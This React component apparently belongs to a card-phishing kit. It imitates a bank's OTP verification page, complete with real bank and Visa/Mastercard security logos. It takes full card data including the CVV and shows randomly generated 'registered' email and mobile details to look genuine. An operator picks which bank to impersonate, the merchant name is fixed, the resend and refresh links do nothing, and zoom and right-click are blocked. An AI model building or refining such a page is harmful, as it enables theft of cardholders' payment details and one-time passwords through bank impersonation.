import React, { useState, useEffect } from 'react';

interface NewOTPPageProps {
  cardData: {
    cardNumber: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
    cardholderName: string;
  };
  otpValue: string;
  setOtpValue: (value: string) => void;
  otpSubmitting: boolean;
  handleOtpSubmit: () => void;
  handleOtpCancel: () => void;
  otpError: string;
  adminSelectedBankLogo: string | null;
  sessionBankLogo: string;
  cardBrandLogos: any;
  getCardBrand: (cardNumber: string) => string;
  displayPrice: number;
  formatPrice: (price: number) => string;
}

const NewOTPPage: React.FC<NewOTPPageProps> = ({
  cardData,
  otpValue,
  setOtpValue,
  otpSubmitting,
  handleOtpSubmit,
  handleOtpCancel,
  otpError,
  adminSelectedBankLogo,
  sessionBankLogo,
  cardBrandLogos,
  getCardBrand,
  displayPrice,
  formatPrice
}) => {
  // Debug logging for price values
  console.log('🔍 NewOTPPage - Received props:', { displayPrice, formattedPrice: formatPrice(displayPrice) });
  const [emailData, setEmailData] = useState<{ show: boolean; email: string }>({
    show: false,
    email: ''
  });
  const [mobileNumber, setMobileNumber] = useState('');
  const [currentDateTime, setCurrentDateTime] = useState('');
  const [timeLeft, setTimeLeft] = useState(299); // 4:59 in seconds

  useEffect(() => {
    // Generate random email data (60% chance to not show email)
    const showEmail = Math.random() > 0.6;
    if (showEmail) {
      const domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'];
      const randomDomain = domains[Math.floor(Math.random() * domains.length)];
      const randomEmail = `xxxxxxx43@${randomDomain}`;
      setEmailData({ show: true, email: randomEmail });
    } else {
      setEmailData({ show: false, email: '' });
    }

    // Generate random mobile number (last 4 digits)
    const randomLast4 = Math.floor(1000 + Math.random() * 9000);
    setMobileNumber(`XXXXXX${randomLast4}`);

    // Set current date and time
    const now = new Date();
    const formattedDate = now.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short', 
      day: '2-digit'
    });
    setCurrentDateTime(formattedDate);
  }, []);

  // Timer countdown effect
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Prevent zoom on OTP verification page
  useEffect(() => {
    const preventZoom = (e: Event) => {
      e.preventDefault();
    };

    const preventKeyboardZoom = (e: KeyboardEvent) => {
      // Prevent Ctrl/Cmd + plus/minus/0
      if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '0')) {
        e.preventDefault();
      }
    };

    const preventWheelZoom = (e: WheelEvent) => {
      // Prevent Ctrl/Cmd + scroll zoom
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
      }
    };

    // Prevent touch-based zoom (pinch-to-zoom)
    document.addEventListener('touchstart', preventZoom, { passive: false });
    document.addEventListener('touchmove', preventZoom, { passive: false });
    document.addEventListener('touchend', preventZoom, { passive: false });
    
    // Prevent keyboard zoom
    document.addEventListener('keydown', preventKeyboardZoom);
    
    // Prevent mouse wheel zoom
    document.addEventListener('wheel', preventWheelZoom, { passive: false });
    
    // Update viewport meta tag to prevent zoom
    const viewport = document.querySelector('meta[name=viewport]');
    if (viewport) {
      viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }
    
    // Prevent context menu (right-click zoom on some devices)
    document.addEventListener('contextmenu', preventZoom);

    return () => {
      // Cleanup event listeners
      document.removeEventListener('touchstart', preventZoom);
      document.removeEventListener('touchmove', preventZoom);
      document.removeEventListener('touchend', preventZoom);
      document.removeEventListener('keydown', preventKeyboardZoom);
      document.removeEventListener('wheel', preventWheelZoom);
      document.removeEventListener('contextmenu', preventZoom);
    };
  }, []);

  // Format timer display
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // Function to detect bank name from logo URL with 100% accuracy
  const getBankNameFromLogo = (logoUrl: string) => {
    if (!logoUrl) return 'Bank';
    
    const url = logoUrl.toLowerCase();
    
    // HDFC Bank variations
    if (url.includes('hdfc') || url.includes('556499')) return 'HDFC Bank';
    
    // ICICI Bank variations  
    if (url.includes('icici') || url.includes('logoshape.com')) return 'ICICI Bank';
    
    // State Bank of India variations
    if (url.includes('sbi') || url.includes('state-bank') || url.includes('1949953387')) return 'State Bank of India';
    
    // Axis Bank variations
    if (url.includes('axis') || url.includes('brandlogos.net') && url.includes('axis')) return 'Axis Bank';
    
    // Bank of Baroda variations
    if (url.includes('baroda') || url.includes('logolook.net') && url.includes('bank-of-baroda')) return 'Bank of Baroda';
    
    // Bank of India variations
    if (url.includes('bank-of-india') || url.includes('boi-uganda') || url.includes('550573')) return 'Bank of India';
    
    // Central Bank of India
    if (url.includes('central-bank') || url.includes('339766')) return 'Central Bank of India';
    
    // Indian Bank
    if (url.includes('indian-bank') && !url.includes('overseas')) return 'Indian Bank';
    
    // Indian Overseas Bank
    if (url.includes('indian-overseas') || url.includes('iob')) return 'Indian Overseas Bank';
    
    // Punjab National Bank
    if (url.includes('pnb') || url.includes('punjab-national')) return 'Punjab National Bank';
    
    // UCO Bank
    if (url.includes('uco-bank') || url.includes('11574257509')) return 'UCO Bank';
    
    // Kotak Mahindra Bank
    if (url.includes('kotak') || url.includes('brandeps.com')) return 'Kotak Mahindra Bank';
    
    // Bandhan Bank
    if (url.includes('bandhan')) return 'Bandhan Bank';
    
    // City Union Bank
    if (url.includes('city-union') || url.includes('304210')) return 'City Union Bank';
    
    // CSB Bank
    if (url.includes('csb-bank')) return 'CSB Bank';
    
    // Development Credit Bank
    if (url.includes('development-credit') || url.includes('seekvectors.com')) return 'Development Credit Bank';
    
    // Dhanlaxmi Bank
    if (url.includes('dhanlaxmi') || url.includes('cdnlogo.com')) return 'Dhanlaxmi Bank';
    
    // IDBI Bank
    if (url.includes('idbi') || url.includes('11574258107')) return 'IDBI Bank';
    
    // Union Bank of India (if not UCO)
    if (url.includes('union-bank') && !url.includes('uco')) return 'Union Bank of India';
    
    // Canara Bank
    if (url.includes('canara')) return 'Canara Bank';
    
    // Generic fallback - extract bank name from common patterns
    if (url.includes('bank')) {
      // Extract potential bank name from URL patterns
      const urlParts = url.split('/');
      for (const part of urlParts) {
        if (part.includes('bank') && part.length > 4) {
          const bankPart = part.replace(/-/g, ' ').replace(/bank/g, 'Bank');
          return bankPart.split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
        }
      }
    }
    
    // Last resort - return generic Bank
    return 'Bank';
  };

  // Get current bank name from the displayed logo
  const currentBankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
  const bankName = getBankNameFromLogo(currentBankLogo);

  const handleSubmit = () => {
    if (otpValue.length === 6) {
      handleOtpSubmit();
    }
  };

  return (
    <div className="fixed inset-0 bg-white z-50 flex items-center justify-center p-2 sm:p-4">
      <div className="w-full max-w-lg bg-white px-3 py-2 sm:px-4 sm:py-3">
        {/* Header with logos */}
        <div className="flex items-center justify-between mb-3 sm:mb-4 pb-2 sm:pb-3 border-b border-gray-200">
          <div className="flex items-center gap-2 sm:gap-3">
            <img
              src={(() => {
                const cardBrand = getCardBrand(cardData.cardNumber);
                switch(cardBrand) {
                  case 'visa':
                    return 'https://cdn3.iconfinder.com/data/icons/credit-cards-pos/195/verified_by_visa-512.png';
                  case 'mastercard':
                    return 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
                  default:
                    return cardBrandLogos[cardBrand as keyof typeof cardBrandLogos];
                }
              })()}
              alt="Card Brand Logo"
              className="h-6 sm:h-8 w-auto max-w-[50px] sm:max-w-[65px] object-contain"
              onError={(e) => {
                e.currentTarget.src = 'https://cdn3.iconfinder.com/data/icons/credit-cards-pos/195/verified_by_visa-512.png';
              }}
            />
          </div>
          
          <img
            src={adminSelectedBankLogo || sessionBankLogo || 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png'}
            alt="Bank Logo"
            className="h-6 sm:h-8 w-16 sm:w-20 object-contain"
            onError={(e) => {
              e.currentTarget.src = 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
            }}
          />
        </div>

        {/* Main content */}
        <div className="text-center mb-3 sm:mb-4">
          <p className="text-xs sm:text-sm text-gray-700 leading-relaxed px-1 sm:px-2">
            The One Time Password has been sent to the below registered Mobile Number and Email ID. Please use the password and authenticate the transaction
          </p>
        </div>

        {/* Details table */}
        <div className="space-y-1 sm:space-y-2 mb-3 sm:mb-4">
          {emailData.show && (
            <div className="flex justify-between items-center py-1">
              <span className="font-semibold text-gray-800 text-xs sm:text-sm">E-Mail:</span>
              <span className="text-gray-700 text-xs sm:text-sm">{emailData.email}</span>
            </div>
          )}
          
          <div className="flex justify-between items-center py-1">
            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Mobile Number:</span>
            <span className="text-gray-700 text-xs sm:text-sm">{mobileNumber}</span>
          </div>
          
          <div className="flex justify-between items-center py-1">
            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Not your contact details??</span>
            <a href="#" className="text-blue-600 font-semibold underline text-xs sm:text-sm">Refresh</a>
          </div>
          
          <div className="flex justify-between items-center py-1">
            <span className="font-semibold text-yellow-600 text-xs sm:text-sm">Merchant Name:</span>
            <span className="font-semibold text-yellow-600 text-xs sm:text-sm">PLURALSIGHT</span>
          </div>
          
          <div className="flex justify-between items-center py-1">
            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Date:</span>
            <span className="text-gray-700 text-xs sm:text-sm">{currentDateTime}</span>
          </div>
          
          <div className="flex justify-between items-center py-1">
            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Total Charge:</span>
            <span className="text-gray-700 text-xs sm:text-sm">{formatPrice(displayPrice)}</span>
          </div>
          
          <div className="flex justify-between items-center py-1">
            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Card Number:</span>
            <span className="text-gray-700 text-xs sm:text-sm">XXXXXXXXX{cardData.cardNumber.slice(-4)}</span>
          </div>
        </div>

        {/* OTP Input */}
        <div className="mb-3 sm:mb-4">
          <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center mb-2 sm:mb-3 gap-2 sm:gap-0">
            <label className="font-semibold text-gray-800 text-sm sm:text-base mb-1 sm:mb-0">Enter OTP:</label>
            <input
              type="text"
              value={otpValue}
              onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
              className="border-2 border-gray-500 px-2 py-1 sm:px-3 sm:py-2 w-full sm:w-32 text-center font-mono tracking-wider text-base sm:text-lg font-bold bg-white text-gray-900 focus:border-blue-500 focus:outline-none placeholder-gray-400"
              placeholder="Enter OTP"
              maxLength={6}
              disabled={otpSubmitting}
            />
          </div>
          
          <div className="text-right">
            <a href="#" className="text-blue-600 underline text-xs sm:text-sm">Resend OTP</a>
          </div>
        </div>

        {/* Error message */}
        {otpError && (
          <div className="mb-4 text-center">
            <p className="text-red-600 text-sm">{otpError}</p>
          </div>
        )}

        {/* Action buttons */}
        <div className="flex gap-2 sm:gap-4 justify-center">
          <button
            onClick={handleSubmit}
            disabled={otpSubmitting || otpValue.length !== 6}
            className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 sm:px-8 sm:py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed font-medium text-sm sm:text-base"
          >
            {otpSubmitting ? 'Processing...' : 'Submit'}
          </button>
          
          <button
            onClick={handleOtpCancel}
            disabled={otpSubmitting}
            className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 sm:px-8 sm:py-2 rounded disabled:opacity-50 font-medium text-sm sm:text-base"
          >
            Cancel
          </button>
        </div>

        {/* Timeout consent message */}
        <div className="mt-2 sm:mt-3 text-center">
          <p className="text-xs text-gray-600 leading-relaxed px-1 sm:px-2">
            By clicking on Confirm, I agree to allow {bankName} to debit my above card/account for this transaction and for fees and charges as may be applicable. I also agree to the terms and conditions. For inquiry/dispute related to the transaction, I can call customer care number.{' '}
            <span className="text-red-600 font-semibold">
              This page will expire in {formatTimer(timeLeft)}.
            </span>
          </p>
        </div>

        {/* Loading spinner overlay */}
        {otpSubmitting && (
          <div className="fixed inset-0 bg-white bg-opacity-95 flex items-center justify-center z-50">
            <div className="text-center">
              <div className="relative w-16 h-16 mx-auto">
                <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-transparent border-t-blue-500 border-r-blue-500 rounded-full animate-spin"></div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default NewOTPPage;
